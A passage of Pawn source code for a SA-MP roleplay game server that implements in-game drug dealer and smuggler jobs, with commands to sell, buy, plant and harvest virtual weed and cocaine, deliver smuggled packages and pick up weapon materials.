	// L1: 0 | L2: 100 | L3: 300 | L4: 700 | L5: 1200
	if(strval(var) == 7) format(var, 4, "10");
	if(RPJS(playerid, strval(var)) < 100) left = 100 - RPJS(playerid, strval(var));
	else if(RPJS(playerid, strval(var)) < 300) left = 300 - RPJS(playerid, strval(var));
	else if(RPJS(playerid, strval(var)) < 700) left = 700 - RPJS(playerid, strval(var));
	else if(RPJS(playerid, strval(var)) < 1200) left = 1200 - RPJS(playerid, strval(var));
	if(strval(var) == 1)
	{
	    format(string, sizeof(string), "** Lawyer Level: %s. (You need to defend/free %d more players to level up) **", RPJL(playerid, strval(var)), left);
	    SendClientMessage(playerid, COLOR_YELLOW, string);
	}
	else if(strval(var) == 2)
	{
	    format(string, sizeof(string), "** Fisher Level: %s. (You need to fish %d more fishes to level up) **", RPJL(playerid, strval(var)), left);
	    SendClientMessage(playerid, COLOR_YELLOW, string);
	}
    else if(strval(var) == 3)
	{
	    format(string, sizeof(string), "** Weapons Dealer Level: %s. (You need to sell %d more weapons to level up) **", RPJL(playerid, strval(var)), left);
	    SendClientMessage(playerid, COLOR_YELLOW, string);
	}
	else if(strval(var) == 4)
	{
	    format(string, sizeof(string), "** Weapons Smuggler Level: %s. (You need to deliver %d more materials to level up) **", RPJL(playerid, strval(var)), left);
	    SendClientMessage(playerid, COLOR_YELLOW, string);
	}
	else if(strval(var) == 5)
	{
	    format(string, sizeof(string), "** Drugs Dealer Level: %s. (You need to sell %d more drugs to level up) **", RPJL(playerid, strval(var)), left);
	    SendClientMessage(playerid, COLOR_YELLOW, string);
	}
	else if(strval(var) == 6)
	{
	    format(string, sizeof(string), "** Drugs Smuggler Level: %s. (You need to smuggle %d more packages to level up) **", RPJL(playerid, strval(var)), left);
	    SendClientMessage(playerid, COLOR_YELLOW, string);
	}
	return 1;
}


IRP:sellweed(playerid, var[])
{
	new user, string[128], amount, price, maxweed;
	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pJob] != JOB_DDEALER && Player[playerid][pVIPJob] != JOB_DDEALER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Drugs Dealer.");
	if(sscanf(var, "uii", user, amount, price)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sellweed [playerid] [amount] [price]");
    if(!Logged(user)) return NoLoginB(playerid);
	if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
	if(playerid == user) return SendClientMessage(playerid, COLOR_GRAD2, "You can't sell weed to yourself.");
	if(WeedSeller[user] == playerid) SendClientMessage(playerid, COLOR_GRAD2, "You have already offered this player to buy weed.");
	if(Player[playerid][pWeed] <= amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that amount of weed on you.");
	if(price <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering an invalid price.");
	if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering an invalid amount.");
	if(strval(RPJL(user, JOB_DDEALER)) == 1) maxweed = 10;
   	else if(strval(RPJL(user, JOB_DDEALER)) == 2) maxweed = 15;
   	else if(strval(RPJL(user, JOB_DDEALER)) == 3) maxweed = 20;
   	else if(strval(RPJL(user, JOB_DDEALER)) == 4) maxweed = 25;
   	else if(strval(RPJL(user, JOB_DDEALER)) == 5) maxweed = 30;
	if(Player[user][pWeed] + amount > maxweed) return SendClientMessage(playerid, COLOR_GRAD2, "Player can't hold that amount of weed at the moment.");
	WeedSeller[user] = playerid;
	WeedPrice[playerid][user] = price;
	WeedAmount[playerid][user] = amount;
	format(string, sizeof(string), " You have offered %s %d grams of weed for $%d.", GetName(user), amount, price);
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	format(string, sizeof(string), " %s has offered you %d grams of weed for $%d. (/accept weed) (/deny weed)", GetName(playerid), amount, price);
    SendClientMessage(user, COLOR_LIGHTBLUE, string);
	return 1;
}

IRP:sellcocaine(playerid, var[])
{
	new user, string[128], amount, price, maxcocaine;
	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pJob] != JOB_DDEALER && Player[playerid][pVIPJob] != JOB_DDEALER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Drugs Dealer.");
	if(sscanf(var, "uii", user, amount, price)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sellcocaine [playerid] [amount] [price]");
    if(!Logged(user)) return NoLoginB(playerid);
	if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
	if(playerid == user) return SendClientMessage(playerid, COLOR_GRAD2, "You can't sell cocaine to yourself.");
	if(cocaineSeller[user] == playerid) SendClientMessage(playerid, COLOR_GRAD2, "You have already offered this player to buy cocaine.");
	if(Player[playerid][pCocaine] <= amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that amount of cocaine on you.");
	if(price <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering an invalid price.");
	if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering an invalid amount.");
	if(strval(RPJL(user, JOB_DDEALER)) == 1) maxcocaine = 10;
   	else if(strval(RPJL(user, JOB_DDEALER)) == 2) maxcocaine = 15;
   	else if(strval(RPJL(user, JOB_DDEALER)) == 3) maxcocaine = 20;
   	else if(strval(RPJL(user, JOB_DDEALER)) == 4) maxcocaine = 25;
   	else if(strval(RPJL(user, JOB_DDEALER)) == 5) maxcocaine = 30;
	if(Player[user][pCocaine] + amount > maxcocaine) return SendClientMessage(playerid, COLOR_GRAD2, "Player can't hold that amount of cocaine at the moment.");
	cocaineSeller[user] = playerid;
	cocainePrice[playerid][user] = price;
	cocaineAmount[playerid][user] = amount;
	format(string, sizeof(string), " You have offered %s %d grams of cocaine for $%d.", GetName(user), amount, price);
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	format(string, sizeof(string), " %s has offered you %d grams of cocaine for $%d. (/accept cocaine) (/deny cocaine)", GetName(user), amount, price);
    SendClientMessage(user, COLOR_LIGHTBLUE, string);
	return 1;
}
IRP:sellseeds(playerid, var[])
{
	new user, string[128], amount, price, maxseeds;
	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pJob] != JOB_DDEALER && Player[playerid][pVIPJob] != JOB_DDEALER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Drugs Dealer.");
	if(sscanf(var, "uii", user, amount, price)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sellseeds [playerid] [amount] [price]");
    if(!Logged(user)) return NoLoginB(playerid);
	if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
	if(playerid == user) return SendClientMessage(playerid, COLOR_GRAD2, "You can't sell seeds to yourself.");
	if(seedSeller[user] == playerid) SendClientMessage(playerid, COLOR_GRAD2, "You have already offered this player to buy seeds.");
	if(Player[playerid][pSeeds] <= amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that amount of seeds on you.");
	if(price <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering an invalid price.");
	if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering an invalid amount.");
	if(strval(RPJL(user, JOB_DDEALER)) == 1) maxseeds = 10;
   	else if(strval(RPJL(user, JOB_DDEALER)) == 2) maxseeds = 15;
   	else if(strval(RPJL(user, JOB_DDEALER)) == 3) maxseeds = 20;
   	else if(strval(RPJL(user, JOB_DDEALER)) == 4) maxseeds = 25;
   	else if(strval(RPJL(user, JOB_DDEALER)) == 5) maxseeds = 30;
	if(Player[user][pSeeds] + amount > maxseeds) return SendClientMessage(playerid, COLOR_GRAD2, "Player can't hold that amount of seeds at the moment.");
	seedSeller[user] = playerid;
	seedPrice[playerid][user] = price;
	seedAmount[playerid][user] = amount;
	format(string, sizeof(string), " You have offered %s %d seeds for $%d.", GetName(user), amount, price);
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	format(string, sizeof(string), " %s has offered you %d seeds e for $%d. (/accept seeds) (/deny seeds)", GetName(user), amount, price);
    SendClientMessage(user, COLOR_LIGHTBLUE, string);
	return 1;
}

IRP:buyseed(playerid, var[])
{
	new amount, maxweed, string[128];
	if(strval(RPJL(playerid, JOB_DDEALER)) == 1) maxweed = 10;
   	else if(strval(RPJL(playerid, JOB_DDEALER)) == 2) maxweed = 15;
   	else if(strval(RPJL(playerid, JOB_DDEALER)) == 3) maxweed = 20;
   	else if(strval(RPJL(playerid, JOB_DDEALER)) == 4) maxweed = 25;
   	else if(strval(RPJL(playerid, JOB_DDEALER)) == 5) maxweed = 30;
	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pJob] != JOB_DDEALER && Player[playerid][pVIPJob] != JOB_DDEALER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Drugs Dealer.");
   	if(!IsPlayerInRangeOfPoint(playerid, 2, 323.0012,1118.5720,1083.8828)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not near the Seed Pickup.");
   	if(GetPlayerVirtualWorld(playerid) != 0) return SendClientMessage(playerid, COLOR_GRAD2, "You are not near the Seed Pickup.");
   	if(sscanf(var, "i", amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /buyseed [amount]");
   	if(amount < 0) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering an invalid amount of seed.");
   	if(Player[playerid][pMoney] < amount*400) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you.");
   	if(amount > Seed) return SendClientMessage(playerid, COLOR_GRAD2, "The Seeds House doesn't have that amount of seed at the moment.");
    if(Player[playerid][pSeeds] + amount > maxweed) return SendClientMessage(playerid, COLOR_GRAD2, "You can't hold that much seed at the moment.");
    GiveZamoraMoney(playerid, -amount*400);
    if(PointInfo[0][pOwner])
    {
		new idx = PointInfo[0][pOwner];
		FamInfo[idx][fMoney] += amount*400;
		PointInfo[0][pProfit] += amount*400;
    }
    Player[playerid][pSeeds] += amount;
	Seed -= amount;
	format(string, sizeof(string), "Seed Pickup\n{01A9DB}/buyseed {FFFFFF}to get seed\nAvailable Stock: {01A9DB}%d{FFFFFF}/{01A9DB}2000", Seed);
	UpdateDynamic3DTextLabelText(SeedsText, COLOR_WHITE, string);
    format(string, sizeof(string), "* %s has bought %d grams of seed for $%d.", GetName(playerid), amount, amount*400);
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	return 1;
}
IRP:plant(playerid, var[])
{
    new string[128];
	if(Player[playerid][pJob] != JOB_DDEALER && Player[playerid][pVIPJob] != JOB_DDEALER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Drugs Dealer.");
 	if(Player[playerid][pSeeds] > 4)
    {
		if(IsValidDynamicObject(Player[playerid][pWeedObject])) return SendClientMessage(playerid, COLOR_GRAD2, "You already have a plant growing.");
		if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You can't plant while in a vehicle.");
    	GetPlayerPos(playerid, Player[playerid][pWeedPos][0], Player[playerid][pWeedPos][1], Player[playerid][pWeedPos][2]);
		Player[playerid][pWeedPos][2] -= 1.5;
        ApplyAnimation(playerid,"BOMBER","BOM_Plant_Crouch_In", 4.0, 0, 0, 0, 0, 0, 1);
		SendClientMessage(playerid, COLOR_GREEN, "You have planted some weed. It will take around 20-45 minutes to grow.");
		Player[playerid][pWeedInt] = GetPlayerInterior(playerid);
		Player[playerid][pWeedVW] = GetPlayerVirtualWorld(playerid);
		Player[playerid][pWeedGrowth] = 0;
		Player[playerid][pSeeds]--;
		Player[playerid][pWeedObject] = CreateDynamicObject(3409, Player[playerid][pWeedPos][0], Player[playerid][pWeedPos][1], Player[playerid][pWeedPos][2], 0.0, 0.0, 0.0, Player[playerid][pWeedVW], Player[playerid][pWeedInt]);
		format(string, sizeof(string), "* %s plants some weed.", GetName(playerid));
		SendNearbyMessage(playerid, 10, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
	else
	{
    	SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough seeds to plant - head to the seeds house and pick up some seeds ((/buyseed)).");
    }
	return 1;
}
IRP:pickweed(playerid, var[])
{
	new string[128];
	foreach(Player, i) if(IsValidDynamicObject(Player[i][pWeedObject]) && IsPlayerInRangeOfPoint(playerid, 4, Player[i][pWeedPos][0], Player[i][pWeedPos][1], Player[i][pWeedPos][2])) {
	    if(GetPlayerVirtualWorld(playerid) == Player[i][pWeedVW] && GetPlayerInterior(playerid) == Player[i][pWeedInt]) {
			if(Player[i][pWeedGrowth] > 10)
			{
				if(Player[i][pWeedGrowth] + Player[playerid][pWeed] < 100)
				{
					ApplyAnimation(playerid,"BOMBER","BOM_Plant_Crouch_Out", 4.0, 0, 0, 0, 0, 0, 1);
					Player[playerid][pWeed] += Player[i][pWeedGrowth];
					format(string, sizeof(string), "You picked the plant and gathered %d grams of Weed.", Player[i][pWeedGrowth]);
					SendClientMessage(playerid, COLOR_GRAD2, string);
					format(string, sizeof(string), "* %s picks the weed plant.", GetName(playerid));
					SendNearbyMessage(playerid, 10, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
					DestroyDynamicObject(Player[i][pWeedObject]);
					Player[i][pWeedObject] = 0;
					return 1;
				}
				else SendClientMessage(playerid, COLOR_GRAD2, "You can't carry more then 100 grams of Weed.");
			}
			else SendClientMessage(playerid, COLOR_GRAD2, "This plant is not ready to be picked yet.");
			return 1;
		}
	}
	return SendClientMessage(playerid, COLOR_GRAD2, "You're not at a plant.");
}
IRP:checkweed(playerid, var[])
{
    new string[128];
	if(IsValidDynamicObject(Player[playerid][pWeedObject]) && GetPlayerVirtualWorld(playerid) == Player[playerid][pWeedVW] && GetPlayerInterior(playerid) == Player[playerid][pWeedInt]) {
	    if(IsPlayerInRangeOfPoint(playerid, 4, Player[playerid][pWeedPos][0], Player[playerid][pWeedPos][1], Player[playerid][pWeedPos][2])) {
			if(Player[playerid][pWeedGrowth] > 10)
			{
				format(string, sizeof(string), "Your plant currently carries %i grams - use /pickweed to claim it.", Player[playerid][pWeedGrowth]);
				SendClientMessage(playerid, COLOR_GREEN, string);
			}
			else SendClientMessage(playerid, COLOR_GREEN, "Your plant isn't ready to be picked yet.");
			return 1;
		}
	}
	foreach(Player, i) if(IsValidDynamicObject(Player[i][pWeedObject]) && GetPlayerVirtualWorld(playerid) == Player[i][pWeedVW] && GetPlayerInterior(playerid) == Player[i][pWeedInt]) {
	    if(IsPlayerInRangeOfPoint(playerid, 4, Player[i][pWeedPos][0], Player[i][pWeedPos][1], Player[i][pWeedPos][2])) {
			if(Player[i][pWeedGrowth] > 10)
			{
				format(string, sizeof(string), "This plant currently carries %i grams - use /pickweed to claim it.", Player[i][pWeedGrowth]);
				SendClientMessage(playerid, COLOR_WHITE, string);
			}
			else SendClientMessage(playerid, COLOR_YELLOW, "This plant isn't ready to be picked yet.");
			return 1;
		}
	}
	return SendClientMessage(playerid, COLOR_GRAD2, "You're not at a plant.");
}
IRP:buycocaine(playerid, var[])
{
	new amount, maxcocaine, string[128];
	if(strval(RPJL(playerid, JOB_DDEALER)) == 1) maxcocaine = 10;
   	else if(strval(RPJL(playerid, JOB_DDEALER)) == 2) maxcocaine = 15;
   	else if(strval(RPJL(playerid, JOB_DDEALER)) == 3) maxcocaine= 20;
   	else if(strval(RPJL(playerid, JOB_DDEALER)) == 4) maxcocaine = 25;
   	else if(strval(RPJL(playerid, JOB_DDEALER)) == 5) maxcocaine = 30;
	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pJob] != JOB_DDEALER && Player[playerid][pVIPJob] != JOB_DDEALER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Drugs Dealer.");
   	if(!IsPlayerInRangeOfPoint(playerid, 2, 2345.3992,-1185.6423,1027.9766)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not near the cocaine Pickup.");
   	if(sscanf(var, "i", amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /buycocaine [amount]");
   	if(amount < 0) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering an invalid ammount of cocaine.");
   	if(Player[playerid][pMoney] < amount*500) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you.");
   	if(amount > cocaine) return SendClientMessage(playerid, COLOR_GRAD2, "The Cocaine Lab doesn't have that amount of cocaine at the moment.");
    if(Player[playerid][pCocaine] + amount > maxcocaine) return SendClientMessage(playerid, COLOR_GRAD2, "You can't hold that much cocaine at the moment.");
    GiveZamoraMoney(playerid, -amount*500);
    if(PointInfo[1][pOwner])
    {
		new idx = PointInfo[1][pOwner];
		FamInfo[idx][fMoney] += amount*500;
		PointInfo[1][pProfit] += amount*500;
    }
    Player[playerid][pCocaine] += amount;
	cocaine -= amount;
	format(string, sizeof(string), "Cocaine Pickup\n{01A9DB}/buycocaine {FFFFFF}to get cocaine\nAvailable Stock: {01A9DB}%d{FFFFFF}/{01A9DB}2000", cocaine);
	UpdateDynamic3DTextLabelText(cocaineText, COLOR_WHITE, string);
    format(string, sizeof(string), "* %s has bought %d grams of cocaine for $%d.", GetName(playerid), amount, amount*500);
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	return 1;
}

IRP:deliverweed(playerid, var[])
{
	new string[128], packages, oldj, newj;
	if(Player[playerid][pJobSkill][JOB_DSMUGGLER] < 100) packages = 20;
	else if(Player[playerid][pJobSkill][JOB_DSMUGGLER] < 300) packages = 30;
	else if(Player[playerid][pJobSkill][JOB_DSMUGGLER] < 700) packages = 40;
	else if(Player[playerid][pJobSkill][JOB_DSMUGGLER] < 1200) packages = 50;
	else if(Player[playerid][pJobSkill][JOB_DSMUGGLER] >= 1200) packages = 55;
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pJob] != JOB_DSMUGGLER && Player[playerid][pVIPJob] != JOB_DSMUGGLER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Drugs Smuggler.");
   	if(!IsPlayerInRangeOfPoint(playerid, 5, 2173.5125,-1667.5657,15.0859)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not near the Weed Dropoff.");
    AntiTPCheck(playerid);
	if(Player[playerid][pDPackages] != 1) return SendClientMessage(playerid, COLOR_GRAD2, "You have no weed packages on you.");
	if(Seed >= 2000) return SendClientMessage(playerid, COLOR_GRAD2, "The Seeds House can't hold any more weed at the moment.");
	Player[playerid][pDPackages] = 0;
	oldj = strval(RPJL(playerid, JOB_DSMUGGLER));
	Player[playerid][pJobSkill][JOB_DSMUGGLER] ++;
	newj = strval(RPJL(playerid, JOB_DSMUGGLER));
	Seed += packages;
	if(Seed > 2000) Seed = 2000;
	GiveZamoraMoney(playerid, packages*550);
	format(string, sizeof(string), "Seed Pickup\n{01A9DB}/buyseed to get seed\nAvailable Stock: {01A9DB}%d{FFFFFF}/{01A9DB}2000", Seed);
	UpdateDynamic3DTextLabelText(SeedsText, COLOR_WHITE, string);
    format(string, sizeof(string), "* %s has dropped %d weed packages in the dropoff and collected $%d.", GetName(playerid), packages, packages*550);
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	format(string, sizeof(string), "* You have delivered {FF6347}%d{FFFF00} packages for {FF6347}$%d{FFFF00}.", packages, packages*550);
    SendClientMessage(playerid, COLOR_YELLOW, string);
	if(oldj < newj)
	{
	    format(string, sizeof(string), "** Your Drugs Smuggler level is now %d, you can now carry %d packages. **", newj, newj*5);
		SendClientMessage(playerid, COLOR_YELLOW, string);
	}

	return 1;
}
IRP:getcrate(playerid, var[])
{
	new string[128], packages;
	if(Player[playerid][pJobSkill][JOB_DSMUGGLER] < 100) packages = 20;
	else if(Player[playerid][pJobSkill][JOB_DSMUGGLER] < 300) packages = 30;
	else if(Player[playerid][pJobSkill][JOB_DSMUGGLER] < 700) packages = 40;
	else if(Player[playerid][pJobSkill][JOB_DSMUGGLER] < 1200) packages = 50;
	else if(Player[playerid][pJobSkill][JOB_DSMUGGLER] >= 1200) packages = 55;
	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pJob] != JOB_DSMUGGLER && Player[playerid][pVIPJob] != JOB_DSMUGGLER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Drugs Smuggler.");
	if(!IsPlayerInRangeOfPoint(playerid, 3, -1689.6455,1037.2737,45.2109)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not near the Crate Packages Pickup.");
    if(sscanf(var,"s[32]", var))
   	{
        SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /getcrate [package]");
   	    SendClientMessage(playerid, COLOR_GRAD2, "** [PACKAGES]: Weed | Cocaine");
   	    return 1;
   	}
   	if(!strcmp(var, "weed", true))
   	{
        if(Player[playerid][pDPackages]) return SendClientMessage(playerid, COLOR_GRAD2, "You already have packages.");
   	    if(Player[playerid][pMoney] < packages*400) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy the package.");
    	Player[playerid][pDPackages] = 1;
        GiveZamoraMoney(playerid, -(packages*400));
        if(PointInfo[7][pOwner])
        {
      		new idx = PointInfo[7][pOwner];
   		    FamInfo[idx][fMoney] += packages*400;
       		PointInfo[7][pProfit] += packages*400;
        }
        format(string, sizeof(string), "* %s has loaded %d weed packages from the pickup.", GetName(playerid), packages);
    	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
     	format(string, sizeof(string), "* You have loaded {FF6347}%d weed{FFFF00} packages for {FF6347}$%d{FFFF00}, deliver them to the Weed Dropoff. (Checkpoint)", packages, packages*400);
        SendClientMessage(playerid, COLOR_YELLOW, string);
        SendClientMessage(playerid, COLOR_GRAD2, "** Type /deliverweed when you arrive to the checkpoint.");
        SetPlayerCheckpoint(playerid,2173.5125,-1667.5657,15.0859, 3);
        AntiTP[playerid] = 1;
        AntiTPTimer[playerid] = SetTimerEx("AntiTPHacks", 30000, false, "d", playerid);
       	return 1;
   	}
   	else if(!strcmp(var, "cocaine", true))
   	{
        if(Player[playerid][pDPackages]) return SendClientMessage(playerid, COLOR_GRAD2, "You already have packages.");
   	    if(Player[playerid][pMoney] < packages*500) return SendClientMessage(playerid, COLOR_GRAD2, "You can't afford to buy the package.");
    	Player[playerid][pDPackages] = 2;
        GiveZamoraMoney(playerid, -(packages*500));
        if(PointInfo[7][pOwner])
        {
      		new idx = PointInfo[7][pOwner];
   		    FamInfo[idx][fMoney] += packages*500;
       		PointInfo[7][pProfit] += packages*500;
        }
        format(string, sizeof(string), "* %s has loaded %d cocaine packages from the pickup.", GetName(playerid), packages);
    	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    	format(string, sizeof(string), "* You have loaded {FF6347}%d cocaine{FFFF00} packages for {FF6347}$%d{FFFF00}, deliver them to the cocaine Dropoff. (Checkpoint)", packages, packages*500);
        SendClientMessage(playerid, COLOR_YELLOW, string);
        SendClientMessage(playerid, COLOR_GRAD2, "** Type /delivercocaine when you arrive to the checkpoint.");
        SetPlayerCheckpoint(playerid, 2348.5220,-1167.7446,27.7726,3);
        AntiTPTimer[playerid] = SetTimerEx("AntiTPHacks", 30000, false, "d", playerid);
       	return 1;
   	}
   	return 1;
}

IRP:delivercocaine(playerid, var[])
{
	new string[128], packages, oldj, newj;
	if(Player[playerid][pJobSkill][JOB_DSMUGGLER] < 100) packages = 5;
	else if(Player[playerid][pJobSkill][JOB_DSMUGGLER] < 300) packages = 10;
	else if(Player[playerid][pJobSkill][JOB_DSMUGGLER] < 700) packages = 15;
	else if(Player[playerid][pJobSkill][JOB_DSMUGGLER] < 1200) packages = 20;
	else if(Player[playerid][pJobSkill][JOB_DSMUGGLER] >= 1200) packages = 25;
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pJob] != JOB_DSMUGGLER && Player[playerid][pVIPJob] != JOB_DSMUGGLER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Drugs Smuggler.");
   	if(!IsPlayerInRangeOfPoint(playerid, 3, 2348.5220,-1167.7446,27.7726)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not near the cocaine Dropoff.");
    AntiTPCheck(playerid);
	if(Player[playerid][pDPackages] != 2) return SendClientMessage(playerid, COLOR_GRAD2, "You have no cocaine packages on you.");
	if(cocaine >= 2000) return SendClientMessage(playerid, COLOR_GRAD2, "The Cocaine Lab can't hold any more cocaine at the moment.");
 	Player[playerid][pDPackages] = 0;
	oldj = strval(RPJL(playerid,JOB_DSMUGGLER));
	Player[playerid][pJobSkill][JOB_DSMUGGLER] ++;
	newj = strval(RPJL(playerid,JOB_DSMUGGLER));
	cocaine += packages;
	if(cocaine > 2000) cocaine = 2000;
	GiveZamoraMoney(playerid, packages*650);
	format(string, sizeof(string), "Cocaine Pickup\n{01A9DB}/buycocaine to get cocaine\nAvailable Stock: %d/2000", cocaine);
	UpdateDynamic3DTextLabelText(cocaineText, COLOR_RED, string);
    format(string, sizeof(string), "* %s has dropped %d cocaine packages in the dropoff and collected $%d.", GetName(playerid), packages, packages*650);
	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	format(string, sizeof(string), "* You have delivered {FF6347}%d{FFFF00} packages for {FF6347}$%d{FFFF00}.", packages, packages*650);
    SendClientMessage(playerid, COLOR_YELLOW, string);
	if(oldj < newj)
	{
	    format(string, sizeof(string), "** Your Drugs Smuggler level is now %d, you can now carry %d packages. **", newj, newj*5);
		SendClientMessage(playerid, COLOR_YELLOW, string);
	}

	return 1;
}


IRP:getmats(playerid, var[])
{
	new string[138], packages;
	if(Player[playerid][pJobSkill][JOB_WSMUGGLER] < 100) packages = 5;
	else if(Player[playerid][pJobSkill][JOB_WSMUGGLER] < 300) packages = 10;
	else if(Player[playerid][pJobSkill][JOB_WSMUGGLER] < 700) packages = 15;
	else if(Player[playerid][pJobSkill][JOB_WSMUGGLER] < 1200) packages = 20;
	else if(Player[playerid][pJobSkill][JOB_WSMUGGLER] >= 1200) packages = 25;
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pJob] != JOB_WSMUGGLER && Player[playerid][pVIPJob] != JOB_WSMUGGLER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Weapons Smuggler.");
   	if(!IsPlayerInRangeOfPoint(playerid, 3, 2128.8381,-102.9780,2.1263) && !IsPlayerInRangeOfPoint(playerid, 3, 2118.5664,-103.2024,2.1263) && !IsPlayerInRangeOfPoint(playerid, 3, 2120.7715,-114.0335,2.1263)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not near a Material Pickup.");
   	if(IsPlayerInRangeOfPoint(playerid, 3, 2128.8381,-102.9780,2.1263)) //low mats
   	{
        if(Player[playerid][pMoney] < packages*250) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
	    if(Player[playerid][pLMPackages]) return SendClientMessage(playerid, COLOR_GRAD2, "You are already carrying packages.");
		if(Player[playerid][pMMPackages]) return SendClientMessage(playerid, COLOR_GRAD2, "You are already carrying packages.");
		if(Player[playerid][pHMPackages]) return SendClientMessage(playerid, COLOR_GRAD2, "You are already carrying packages.");
		Player[playerid][pLMPackages] = 1;
	    GiveZamoraMoney(playerid, -(packages*250));
	    if(PointInfo[3][pOwner])
        {
    		new idx = PointInfo[3][pOwner];
    		FamInfo[idx][fMoney] += packages*250;
    		PointInfo[3][pProfit] += packages*250;
        }
	    format(string, sizeof(string), "* %s has loaded %d low material packages from the pickup.", GetName(playerid), packages);
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		format(string, sizeof(string), "* You have loaded {FF6347}%d low material{FFFF00} packages for {FF6347}$%d{FFFF00}, deliver them to the Materials Dropoff. (Checkpoint)", packages, packages*250);
	    SendClientMessage(playerid, COLOR_YELLOW, string);
	    SendClientMessage(playerid, COLOR_GRAD2, "** Type /delivermats when you arrive to the checkpoint.");
	    SetPlayerCheckpoint(playerid, 2676.7568, -1542.1117, 25.1067, 3.0);
	    AntiTPTimer[playerid] = SetTimerEx("AntiTPHacks", 30000, false, "d", playerid);
	}
	if(IsPlayerInRangeOfPoint(playerid, 3, 2118.5664,-103.2024,2.1263)) //med mats
   	{
        if(Player[playerid][pMoney] < packages*300) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
        if(strval(RPJL(playerid, JOB_WSMUGGLER)) < 3) return SendClientMessage(playerid, COLOR_GRAD2, "Your Weapons Smuggler level is too low to carry medium materials.");
   	    if(Player[playerid][pLMPackages]) return SendClientMessage(playerid, COLOR_GRAD2, "You are already carrying packages.");
		if(Player[playerid][pMMPackages]) return SendClientMessage(playerid, COLOR_GRAD2, "You are already carrying packages.");
		if(Player[playerid][pHMPackages]) return SendClientMessage(playerid, COLOR_GRAD2, "You are already carrying packages.");
		Player[playerid][pMMPackages] = 1;
	    GiveZamoraMoney(playerid, -(packages*300));
	    if(PointInfo[3][pOwner])
        {
    		new idx = PointInfo[3][pOwner];
    		FamInfo[idx][fMoney] += packages*300;
    		PointInfo[3][pProfit] += packages*300;
        }
